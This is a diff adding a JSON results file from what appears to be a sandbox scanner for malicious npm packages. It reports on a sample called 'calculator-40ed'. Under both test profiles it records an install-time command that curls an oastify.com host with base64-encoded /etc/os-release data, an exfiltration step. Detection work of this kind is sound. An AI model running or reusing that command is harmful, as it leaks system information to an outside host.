@@ -1,0 +1,76 @@
+[
+  {
+    "sample": "2025-11-17-calculator-40ed-v4.0.0",
+    "label": "malicious",
+    "root": "../samples/extracted/2025-11-17-calculator-40ed-v4.0.0/tmp/tmp9vtgs_kp/calculator-40ed/package",
+    "profiles": {
+      "laptop": {
+        "flags": {
+          "SUSPICIOUS_EXEC": [
+            "[install] base64 -w0"
+          ],
+          "DNS_LOOKUP": [
+            "[install] dns server 10.0.2.3",
+            "[import] dns server 10.0.2.3"
+          ]
+        },
+        "execs": [
+          "sh -c curl \\\"https://vvucyl6abfnh5bv359d6kqiy4pahy9my.oastify.com/`cat /etc/os-release | base64 -w0`\\\"",
+          "cat /etc/os-release",
+          "base64 -w0",
+          "sh -c node index.js",
+          "node index.js"
+        ],
+        "net": [],
+        "hosts": [],
+        "urls": [
+          "https://vvucyl6abfnh5bv359d6kqiy4pahy9my.oastify.com/"
+        ],
+        "files": [],
+        "exit": [
+          "install_exit=1",
+          "import_exit=0"
+        ]
+      },
+      "ci": {
+        "flags": {
+          "SUSPICIOUS_EXEC": [
+            "[install] base64 -w0"
+          ],
+          "DNS_LOOKUP": [
+            "[install] dns server 10.0.2.3",
+            "[import] dns server 10.0.2.3"
+          ]
+        },
+        "execs": [
+          "sh -c curl \\\"https://vvucyl6abfnh5bv359d6kqiy4pahy9my.oastify.com/`cat /etc/os-release | base64 -w0`\\\"",
+          "cat /etc/os-release",
+          "base64 -w0",
+          "sh -c node index.js",
+          "node index.js"
+        ],
+        "net": [],
+        "hosts": [],
+        "urls": [
+          "https://vvucyl6abfnh5bv359d6kqiy4pahy9my.oastify.com/"
+        ],
+        "files": [],
+        "exit": [
+          "install_exit=1",
+          "import_exit=0"
+        ]
+      }
+    },
+    "warnings": [],
+    "env_differs": false,
+    "diff_flags": [],
+    "flags": [
+      "DNS_LOOKUP",
+      "SUSPICIOUS_EXEC"
+    ],
+    "dynamic_score": 60,
+    "dynamic_verdict": "suspicious",
+    "static_score": 100,
+    "gap": ""
+  }
+]
